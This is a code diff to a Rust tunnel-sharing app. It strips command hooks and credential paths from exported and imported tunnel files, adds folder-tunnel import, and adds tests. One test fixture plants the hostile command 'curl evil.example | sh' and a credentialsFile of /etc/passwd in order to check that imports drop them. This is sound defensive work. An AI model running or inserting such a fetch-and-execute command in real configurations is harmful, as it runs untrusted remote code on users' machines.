@@ -87,13 +87,36 @@ pub fn new_config(id: String, target: &str, name: Option<String>) -> Result<Tunn
         .map_err(|e| e.to_string())
 }
 
-/// The export file for `tunnels`: no ids, and no field that looks like a credential.
+/// Removes fields that run code, write files or only make sense on this computer:
+/// the link hooks (a shared file could otherwise plant a command that runs when the tunnel
+/// goes live) and a named tunnel's account ids and credentials path. The hostname stays.
+fn strip_machine_fields(map: &mut serde_json::Map<String, Value>) {
+    if let Some(Value::Object(lifecycle)) = map.get_mut("lifecycle") {
+        for key in ["urlFile", "urlFileVar", "urlCommand"] {
+            lifecycle.remove(key);
+        }
+    }
+    if let Some(Value::Object(named)) = map.get_mut("named") {
+        named.retain(|key, _| key == "hostname");
+    }
+}
+
+/// The last part of a folder path, for naming an imported folder tunnel.
+fn folder_name(path: &str) -> String {
+    let trimmed = path.trim_end_matches(['/', '\\']);
+    let last = trimmed.rsplit(['/', '\\']).next().unwrap_or(trimmed);
+    clean_name(last).ok().flatten().unwrap_or_else(|| "Folder".into())
+}
+
+/// The export file for `tunnels`: no ids, no field that looks like a credential, and none
+/// of the fields `strip_machine_fields` removes.
 pub fn export_json(tunnels: &[TunnelConfig]) -> Result<String, String> {
     let mut list = Vec::with_capacity(tunnels.len());
     for t in tunnels {
         let mut value = serde_json::to_value(t).map_err(|e| e.to_string())?;
         if let Value::Object(map) = &mut value {
             map.remove("id");
+            strip_machine_fields(map);
         }
         strip_secrets(&mut value);
         list.push(value);
@@ -138,17 +161,31 @@ fn parse_entry(item: Value) -> Result<TunnelConfig, String> {
     let Value::Object(mut map) = item else {
         return Err("It isn't a tunnel entry.".into());
     };
-    let target = match map.get("target") {
-        Some(Value::String(s)) => tunnel::normalize_target(s)?,
-        _ => return Err("The local address is missing.".into()),
+    let is_folder = map.get("kind").and_then(Value::as_str) == Some("folder");
+    let target = if is_folder {
+        match map.get("folder") {
+            Some(Value::String(s)) if std::path::Path::new(s).is_absolute() => String::new(),
+            _ => return Err("The shared folder is missing.".into()),
+        }
+    } else {
+        match map.get("target") {
+            Some(Value::String(s)) => tunnel::normalize_target(s)?,
+            _ => return Err("The local address is missing.".into()),
+        }
     };
+    strip_machine_fields(&mut map);
     let name = match map.get("name") {
         None | Some(Value::Null) => None,
         Some(Value::String(s)) => clean_name(s)?,
         Some(_) => return Err("The name must be text.".into()),
     };
     map.insert("id".into(), Value::String(String::new()));
-    map.insert("name".into(), Value::String(name.unwrap_or_else(|| default_name(&target))));
+    let fallback = if is_folder {
+        map.get("folder").and_then(Value::as_str).map(folder_name).unwrap_or_default()
+    } else {
+        default_name(&target)
+    };
+    map.insert("name".into(), Value::String(name.unwrap_or(fallback)));
     map.insert("target".into(), Value::String(target));
     // Anyone can send an export file, so imported tunnels never start by themselves.
     map.insert("startOnOpen".into(), Value::Bool(false));
@@ -157,19 +194,26 @@ fn parse_entry(item: Value) -> Result<TunnelConfig, String> {
     serde_json::from_value(value).map_err(|e| format!("A setting has the wrong type ({e})."))
 }
 
+/// What makes two tunnels the same for import: the name plus the address, or the folder
+/// for folder tunnels (whose saved address is empty).
+fn dedupe_key(t: &TunnelConfig) -> (String, String) {
+    let place = t.folder.clone().filter(|_| t.target.is_empty()).unwrap_or_else(|| t.target.clone());
+    (t.name.clone(), place)
+}
+
 /// Adds `incoming` to `saved` with new ids. Skips any tunnel with the same name and target
 /// as one already saved, or one earlier in the file. Returns the added tunnels and the
 /// number skipped.
 pub fn merge(saved: &mut Vec<TunnelConfig>, incoming: Vec<TunnelConfig>) -> (Vec<TunnelConfig>, usize) {
     let mut seen: HashSet<(String, String)> = saved
         .iter()
-        .map(|t| (t.name.clone(), t.target.clone()))
+        .map(dedupe_key)
         .collect();
     let mut ids: HashSet<String> = saved.iter().map(|t| t.id.clone()).collect();
     let mut added = Vec::new();
     let mut skipped = 0;
     for mut t in incoming {
-        if !seen.insert((t.name.clone(), t.target.clone())) {
+        if !seen.insert(dedupe_key(&t)) {
             skipped += 1;
             continue;
         }
@@ -215,7 +259,7 @@ pub async fn export_tunnels(app: AppHandle, state: State<'_, AppState>) -> Resul
     let dialog = app
         .dialog()
         .file()
-        .set_title("Export tunnels. Passwords aren't exported.")
+        .set_title("Export tunnels. Passwords and link commands aren't exported.")
         .set_file_name("cloudfairy-tunnels.json")
         .add_filter("Cloudfairy tunnels", &["json"]);
     let Some(path) = pick_path(&app, dialog, Pick::Save).await? else {
@@ -323,6 +367,41 @@ mod tests {
         assert_eq!(parsed[1].target, "http://localhost:5173");
         // Exports start with a byte order mark when edited in some Windows editors.
         assert!(parse_import(&format!("\u{feff}{text}")).is_ok());
+    }
+
+    #[test]
+    fn import_drops_hooks_and_named_tunnel_ids() {
+        let text = file(json!([{ "name": "Shop", "target": "3000",
+            "lifecycle": { "restartOnFailure": true, "stopAfterMinutes": 30,
+                "urlFile": "/tmp/x", "urlFileVar": "URL", "urlCommand": "curl evil.example | sh" },
+            "named": { "hostname": "app.example.com", "tunnelId": "u", "tunnelName": "n",
+                "credentialsFile": "/etc/passwd", "routedHostname": "app.example.com" } }]));
+        let t = &parse_import(&text).unwrap()[0];
+        assert!(t.lifecycle.restart_on_failure && t.lifecycle.stop_after_minutes == 30);
+        assert!(t.lifecycle.url_command.is_empty() && t.lifecycle.url_file.is_empty());
+        let named = serde_json::to_value(t.named.as_ref().unwrap()).unwrap();
+        assert_eq!(named["hostname"], "app.example.com");
+        assert!(named.get("credentialsFile").map_or(true, Value::is_null));
+        assert!(named.get("tunnelId").map_or(true, Value::is_null));
+        // Export leaves them out too.
+        let out: Value = serde_json::from_str(&export_json(std::slice::from_ref(t)).unwrap()).unwrap();
+        assert!(out["tunnels"][0]["lifecycle"].get("urlCommand").is_none());
+    }
+
+    #[test]
+    fn folder_tunnels_import() {
+        let text = file(json!([
+            { "kind": "folder", "folder": if cfg!(windows) { r"C:\Share\Photos" } else { "/share/Photos" }, "target": "" },
+            { "kind": "folder", "folder": if cfg!(windows) { r"C:\Share\Docs" } else { "/share/Docs" }, "name": "Photos" },
+        ]));
+        let parsed = parse_import(&text).unwrap();
+        assert_eq!(parsed[0].name, "Photos");
+        assert_eq!(parsed[0].target, "");
+        let mut saved_list = Vec::new();
+        let (added, skipped) = merge(&mut saved_list, parsed);
+        assert_eq!((added.len(), skipped), (2, 0), "same name, different folder is not a duplicate");
+        let bad = file(json!([{ "kind": "folder", "folder": "relative/path" }]));
+        assert!(parse_import(&bad).is_err());
     }
 
     #[test]
